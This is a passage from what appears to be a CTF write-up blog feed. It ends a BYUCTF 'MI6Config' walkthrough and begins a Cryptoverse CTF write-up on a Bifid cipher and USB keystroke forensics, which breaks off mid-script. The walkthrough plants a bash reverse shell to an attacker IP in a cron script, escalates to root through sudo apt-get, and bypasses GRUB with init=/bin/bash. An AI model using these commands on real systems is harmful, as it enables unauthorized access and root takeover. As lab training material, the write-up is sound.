&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; Documentation:  https:&#x2F;&#x2F;help.ubuntu.com
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; Management:     https:&#x2F;&#x2F;landscape.canonical.com
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Last&lt;&#x2F;span&gt;&lt;span&gt; login: Sat May  6 21:50:34 2023
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;james_bond&lt;&#x2F;span&gt;&lt;span&gt;  q  Shared
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; ls&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -la
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;total&lt;&#x2F;span&gt;&lt;span&gt; 20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;drwxr-xr-x&lt;&#x2F;span&gt;&lt;span&gt;  5 root       root   4096 Apr 17 15:43 .
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;drwxr-xr-x&lt;&#x2F;span&gt;&lt;span&gt; 23 root       root   4096 Apr 17 15:40 ..
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dr-x------&lt;&#x2F;span&gt;&lt;span&gt;  2 james_bond root   4096 Apr 17 22:01 james_bond
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dr-x------&lt;&#x2F;span&gt;&lt;span&gt;  2 q          root   4096 May  3 10:27 q
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dr-xr-x---&lt;&#x2F;span&gt;&lt;span&gt;  2 q          agents 4096 May  3 10:27 Shared
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; id
&lt;&#x2F;span&gt;&lt;span&gt;uid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;1002&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;james_bond&lt;&#x2F;span&gt;&lt;span&gt;) gid=1003(james_bond) groups&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;1003&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;james_bond&lt;&#x2F;span&gt;&lt;span&gt;),1002(agents)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cd Shared
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; ls&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -la
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;total&lt;&#x2F;span&gt;&lt;span&gt; 12
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dr-xr-x---&lt;&#x2F;span&gt;&lt;span&gt; 2 q    agents 4096 May  3 10:27 .
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;drwxr-xr-x&lt;&#x2F;span&gt;&lt;span&gt; 5 root root   4096 Apr 17 15:43 ..
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-rwxrw----&lt;&#x2F;span&gt;&lt;span&gt; 1 q    agents  168 May  3 10:27 update.sh
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$ 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As we see there total 3 folders present in &lt;code&gt;home&lt;&#x2F;code&gt; . &lt;code&gt;Shared&lt;&#x2F;code&gt; folder was accessible to &lt;code&gt;q&lt;&#x2F;code&gt; and &lt;code&gt;agents&lt;&#x2F;code&gt; group. As we can see with the &lt;code&gt;id&lt;&#x2F;code&gt; command &lt;code&gt;james_bond&lt;&#x2F;code&gt; was the member of agents group. So we &lt;code&gt;cd&lt;&#x2F;code&gt; into &lt;strong&gt;Shared&lt;&#x2F;strong&gt; folder and in Shared, &lt;code&gt;update.sh&lt;&#x2F;code&gt; owned by &lt;code&gt;q&lt;&#x2F;code&gt; and can be read and write by the group agents. So looking at the update.sh have this&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cat update.sh
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#This command will run every two minutes and scan for running processes
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#Doing so will protect us from being hacked
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#Please do not change this file
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ps&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -aux
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$ 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can add a payload to the update.sh which will be executed by the user &lt;code&gt;q&lt;&#x2F;code&gt; for every 2 min.&lt;&#x2F;p&gt;
&lt;p&gt;Reverse shell payload for the bash : &lt;code&gt;bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.110&#x2F;8080 0&amp;gt;&amp;amp;1&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cat update.sh
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;bin&#x2F;bash
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#This command will run every two minutes and scan for running processes
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#Doing so will protect us from being hacked
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#Please do not change this file
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#ps -aux
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.110&#x2F;8080 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And started a lister on port 8080 in my parrot machine. After 2 min I got a reverse shell on &lt;code&gt;q&lt;&#x2F;code&gt; machine&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -nlvp&lt;&#x2F;span&gt;&lt;span&gt; 8080
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;listening&lt;&#x2F;span&gt;&lt;span&gt; on &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;any&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; 8080 ...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt; to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;192.168&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;110&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt; from (UNKNOWN) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[192.168.0.133]&lt;&#x2F;span&gt;&lt;span&gt; 44932
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bash:&lt;&#x2F;span&gt;&lt;span&gt; cannot set terminal process group (982)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; Inappropriate ioctl for device
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bash:&lt;&#x2F;span&gt;&lt;span&gt; no job control in this shell
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flag3.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cat flag3.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; flag3.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{cronjobzz&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$ 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag 3 : byuctf{cronjobzz}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Checking for the commands which can be executed as sudo user by the &lt;code&gt;q&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -l
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -l
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Matching&lt;&#x2F;span&gt;&lt;span&gt; Defaults entries for q on MI6:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;env_reset,&lt;&#x2F;span&gt;&lt;span&gt; mail_badpass,
&lt;&#x2F;span&gt;&lt;span&gt;    secure_path&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;usr&#x2F;local&#x2F;sbin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;usr&#x2F;local&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;usr&#x2F;sbin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;usr&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;sbin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;snap&#x2F;bin
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;User&lt;&#x2F;span&gt;&lt;span&gt; q may run the following commands on MI6:
&lt;&#x2F;span&gt;&lt;span&gt;    (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ALL&lt;&#x2F;span&gt;&lt;span&gt;) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;apt-get
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&#x2F;$ 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;apt-get&lt;&#x2F;code&gt; can be executed by the &lt;code&gt;q&lt;&#x2F;code&gt; as the sudo user. So, searching for the apt-get privilege escalation payload results the following payload from &lt;code&gt;gtofbins&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get update -o APT::Update::Pre-Invoke::=&#x2F;bin&#x2F;sh&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This payload will give the reverse shell with the &lt;code&gt;root&lt;&#x2F;code&gt; privileges.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;q@MI6:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; sudo apt-get update&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -o&lt;&#x2F;span&gt;&lt;span&gt; APT::Update::Pre-Invoke::=&#x2F;bin&#x2F;sh
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;  
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; root
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flag4.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cat:&lt;&#x2F;span&gt;&lt;span&gt; flag.txt: No such file or directory
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; flag4.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{sudo_mi6configured&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Good&lt;&#x2F;span&gt;&lt;span&gt; job Hacking!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Good&lt;&#x2F;span&gt;&lt;span&gt; luck on the other challenges!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yayyyy! Finally got the root shell and successfully catted out the root flag4.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{sudo_mi6configured}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;unintend-solution-to-mi6config&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#unintend-solution-to-mi6config&quot; aria-label=&quot;Anchor link for: unintend-solution-to-mi6config&quot;&gt;Unintend Solution to MI6Config&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;We can just press &lt;code&gt;esc&lt;&#x2F;code&gt; to get grub bootloader screen and press &lt;code&gt;e&lt;&#x2F;code&gt; to edit the grub file.&lt;&#x2F;p&gt;
&lt;p&gt;Adding &lt;code&gt;rw init=&#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; in the following line.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_mi61.jpg&quot; class=&quot;autoimg&quot;&gt;
&lt;p&gt;And &lt;code&gt;ctrl + x&lt;&#x2F;code&gt; to save, it will drop us in the root shell.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_mi62.png&quot; class=&quot;autoimg&quot;&gt;
&lt;p&gt;And this as simple as that...&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you for coming this much long with me, Have a nice day!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cryptoverse CTF 2023</title>
        <published>2023-05-09T00:00:00+00:00</published>
        <updated>2023-05-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/cryptoversectf23/"/>
        <id>https://themj0ln1r.github.io/writeups/cryptoversectf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/cryptoversectf23/">&lt;p&gt;Hello all!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1907&quot; target=_blank&gt;CryptoverseCTF 2023&lt;&#x2F;a&gt; which was happened from  06 May to 08 May. I played it with my team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;. This time a couple of automation tasks.&lt;&#x2F;p&gt;
&lt;p&gt;These are the writeups for the challenges I solved.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;warmup-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#warmup-3&quot; aria-label=&quot;Anchor link for: warmup-3&quot;&gt;Warmup 3&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_crypto2.png&quot; alt=&quot;warmup2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Cipher given was a &lt;code&gt;Bifid Cipher&lt;&#x2F;code&gt; (from wikipedia). So, simply decoded it using &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;bifid-cipher&quot; target=_blank&gt; this site &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{funbiffiddecoding}}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics&quot; aria-label=&quot;Anchor link for: forensics&quot;&gt;Forensics&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;the-cyber-heist&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#the-cyber-heist&quot; aria-label=&quot;Anchor link for: the-cyber-heist&quot;&gt;The Cyber Heist&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_cyberh.png&quot; alt=&quot;forensic&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;cvctf23&#x2F;challenge.pcapng&quot;&gt;challenge.pcapng&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There is only one forensic chall and it was fun to do. I opened the pcapng file in wireshark and it there is only the USB data traffic is recorded in the pcapng.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_cyberh1.png&quot; alt=&quot;forensic&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, I did a quick search on google about USB traffic. Found &lt;a href=&quot;https:&#x2F;&#x2F;ctf-wiki.mahaloz.re&#x2F;misc&#x2F;traffic&#x2F;protocols&#x2F;USB&#x2F;&quot; target=_blank&gt;this blog &lt;&#x2F;a&gt;. So, I got to know that, I have to collect the keystrokes of the keyboard and decode it from the traffic to the printable characters.&lt;&#x2F;p&gt;
&lt;p&gt;First of all, I extracted the keystroke data field from the pcapng. The keyboard data is represented in &lt;code&gt;8 bytes&lt;&#x2F;code&gt; and the field of this 8 bytes data is &lt;code&gt;usbhid.data&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_cyberh2.png&quot; alt=&quot;forensic&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, I used &lt;code&gt;Tshark&lt;&#x2F;code&gt; to extract the data in this field.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;foresics$&lt;&#x2F;span&gt;&lt;span&gt; tshark&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -r&lt;&#x2F;span&gt;&lt;span&gt; challenge.pcapng&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -T&lt;&#x2F;span&gt;&lt;span&gt; fields&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -e&lt;&#x2F;span&gt;&lt;span&gt; usbhid.data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -Y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;usb.data_len == 8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; usbdata.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;foresics$&lt;&#x2F;span&gt;&lt;span&gt; head usbdata.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00ffff00ffffffff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00fefe00fefffeff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00feff00feffffff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00feff00feffffff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00fdfd00fdfffdff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00fdff00fdffffff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00fdfd00fdfffdff
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00fdfe00fdfffeff
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, The next step is to convert these bytes to ASCII. And here is my solution script to solve this.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sys
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
&lt;&#x2F;span&gt;&lt;span&gt;DataFileName &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;usbdata.txt&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;presses &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
